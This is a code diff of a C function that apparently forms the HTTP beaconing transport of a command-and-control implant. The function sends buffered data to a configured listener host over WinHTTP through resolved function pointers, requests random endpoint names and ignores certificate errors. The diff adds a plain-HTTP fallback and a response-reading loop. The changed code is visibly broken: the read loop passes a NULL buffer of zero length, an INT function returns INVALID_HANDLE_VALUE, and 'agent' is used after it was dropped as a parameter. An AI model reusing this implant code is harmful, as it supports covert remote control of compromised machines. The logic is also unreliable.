@@ -1,57 +1,80 @@
 #include "Http.h"
+#include "localcstd.h"
 
-INT PerformRequest(pAgent agent, BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) {
-	HANDLE hConnect;
+INT PerformRequest(BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuffer Response) {
+	HINTERNET hConnect;
 	HANDLE hRequest;
 	
 	DWORD HTTP_FLAGS = 0;
+	LPWSTR HttpEndpoint = { 0 };
+	PVOID RespBuffer = { 0 };
+	DWORD BytesRead = 0;
+	SIZE_T TotalBytesAdded = 0;
+	BOOL Success = FALSE;
 	
 
-	HINTERNET hSession = agent->pWinHttpOpen(agent->config->listenerConfig.UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+	HINTERNET hSession = agent->apis->pWinHttpOpen(agent->config->listenerConfig->UserAgent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
 	if (!hSession) {
 		printf("[!] Failure to create http session token: [%08x]\n", GetLastError());
 		return INVALID_HANDLE_VALUE ;
 	}
+	HTTP_FLAGS = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
+	HttpEndpoint = generateRandomStringW(10);
 
-	if (!(hConnect = agent->pWinHttpConnect(hSession, agent->config->listenerConfig.CurrentHost->Host, INTERNET_DEFAULT_HTTPS_PORT, 0))) {
-		printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
-		return INVALID_HANDLE_VALUE;
-	}
-
-	HTTP_FLAGS = WINHTTP_FLAG_BYPASS_PROXY_CACHE; 
-	HTTP_FLAGS |= WINHTTP_FLAG_SECURE;
-
-	if (!(hRequest = agent->pWinHttpOpenRequest(hConnect, agent->config->listenerConfig.Method, generateRandomStringW(10), NULL, NULL, NULL, HTTP_FLAGS))) {
-		printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
-		return INVALID_HANDLE_VALUE;
-	}
-
-	HTTP_FLAGS = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
-		SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
-		SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
-		SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-
-	if (!agent->pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HTTP_FLAGS, sizeof(DWORD)))
+	if (agent->config->listenerConfig->Secure)
 	{
-		printf("[!] Failure to set HTTP OPTIONS => [%08x]", GetLastError());
-		return INVALID_HANDLE_VALUE;
+		if (!(hConnect = agent->apis->pWinHttpConnect(hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTPS_PORT, 0))) {
+			printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
+			return INVALID_HANDLE_VALUE;
+		}
+
+		HTTP_FLAGS |= WINHTTP_FLAG_SECURE;
+
+		if (!(hRequest = agent->apis->pWinHttpOpenRequest(hConnect,(LPCWSTR) agent->config->listenerConfig->Method, HttpEndpoint, NULL, NULL, NULL, HTTP_FLAGS))) {
+			printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
+			return INVALID_HANDLE_VALUE;
+		}
+
+		HTTP_FLAGS = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+			SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+			SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
+			SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
+
+		if (!agent->apis->pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &HTTP_FLAGS, sizeof(DWORD)))
+		{
+			printf("[!] Failure to set HTTP OPTIONS => [%08x]", GetLastError());
+			return INVALID_HANDLE_VALUE;
+		}
 	}
+	
+	else {
+		if (!(hConnect = agent->apis->pWinHttpConnect(hSession, agent->config->listenerConfig->CurrentHost->Host, INTERNET_DEFAULT_HTTP_PORT, 0))) {
+			printf("[!] Failure to connect to http server: [%08x]\n", GetLastError());
+			return INVALID_HANDLE_VALUE;
+		}
+		if (!(hRequest = agent->apis->pWinHttpOpenRequest(hConnect, agent->config->listenerConfig->Method, generateRandomStringW(10), NULL, NULL, NULL, 0))) {
+			printf("[!] Failure to perform request to endpoint [%ls]. Err: [%08x]\n", "RegisterAgent", GetLastError());
+			return INVALID_HANDLE_VALUE;
+		}
+	}
+	
+	
 	int index = 0;
-	while (agent->config->listenerConfig.Headers[index] != NULL) {
-		if (!agent->pWinHttpAddRequestHeaders(hRequest, agent->config->listenerConfig.Headers[index], -1, WINHTTP_ADDREQ_FLAG_ADD)) {
-			printf("[!] Failure to add request headers [%ls]\n", agent->config->listenerConfig.Headers[index]);
+	while (agent->config->listenerConfig->Headers[index] != NULL) {
+		if (!agent->apis->pWinHttpAddRequestHeaders(hRequest, agent->config->listenerConfig->Headers[index], -1, WINHTTP_ADDREQ_FLAG_ADD)) {
+			printf("[!] Failure to add request headers [%ls]\n", agent->config->listenerConfig->Headers[index]);
 		}
 		index++;
 	}
-	if (agent->pWinHttpSendRequest(hRequest, NULL, 0, (LPVOID)Buffer, BufferLength, BufferLength, 0))
+	if (agent->apis->pWinHttpSendRequest(hRequest, NULL, 0, (LPVOID)Buffer, BufferLength, BufferLength, 0))
 	{
-		if (agent->pWinHttpReceiveResponse(hRequest, NULL))
+		if (agent->apis->pWinHttpReceiveResponse(hRequest, NULL))
 		{
 			DWORD StatusCode = 0;
 			DWORD StatusSize = sizeof(DWORD);
 
-			if (!agent->pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+			if (!agent->apis->pWinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
 				WINHTTP_HEADER_NAME_BY_INDEX,
 				&StatusCode,
 				&StatusSize,
@@ -64,6 +87,33 @@ INT PerformRequest(pAgent agent, BYTE* Buffer, SIZE_T BufferLength, OUT pDataBuf
 				printf("[!] Failure to perform request [%d]\n", StatusCode);
 				return INVALID_HANDLE_VALUE;
 			}
+
+			if (Response)
+			{
+				RespBuffer = NULL;
+
+				do
+				{
+					Success = agent->apis->pWinHttpReadData(hRequest, RespBuffer, 0, &BytesRead);
+					if (!Success || BytesRead == 0) {
+						break;
+					}
+
+					if (!RespBuffer)
+					{
+						RespBuffer = agent->apis->pLocalAlloc(LPTR, BytesRead);
+					}
+					else {
+						RespBuffer = agent->apis->pLocalReAlloc(RespBuffer, TotalBytesAdded + BytesRead, LMEM_MOVEABLE | LMEM_ZEROINIT);
+					}
+
+				} while (Success == TRUE);
+			}
+		}
+		else {
+			printf("[!] Failure to receive response: [%08x]\n", GetLastError());
+			return INVALID_HANDLE_VALUE;
+	
 		}
 	}
 	else {
